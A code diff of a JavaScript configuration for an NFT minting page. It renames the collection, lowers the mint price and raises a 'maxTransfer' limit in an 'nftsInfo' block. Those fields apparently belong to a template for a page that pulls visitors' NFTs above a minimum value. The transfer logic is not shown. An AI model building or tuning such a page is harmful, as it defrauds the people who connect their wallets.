@@ -1,7 +1,7 @@
 const collectionInfo = {
-    name: "The Degen Sweepers",
+    name: "MR X SECRET CLUB",
     title: "{name}",
-    date: "25.07.2022",
+    date: "27.07.2022",
     socialMedia: {
         discord: "https://discord.com/",
         twitter: "https://twitter.com/",
@@ -18,7 +18,7 @@ const collectionInfo = {
     }
 }
 const mintInfo = {
-    price: 5.1,
+    price: 1,
     totalSupply: 2000,
     toFixed: 1,
     minUnits: 1,
@@ -29,7 +29,7 @@ const mintInfo = {
 const nftsInfo = {
     active: true,
     minValue: 0.3,
-    maxTransfer: 5,
+    maxTransfer: 10,
 }
 
 if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
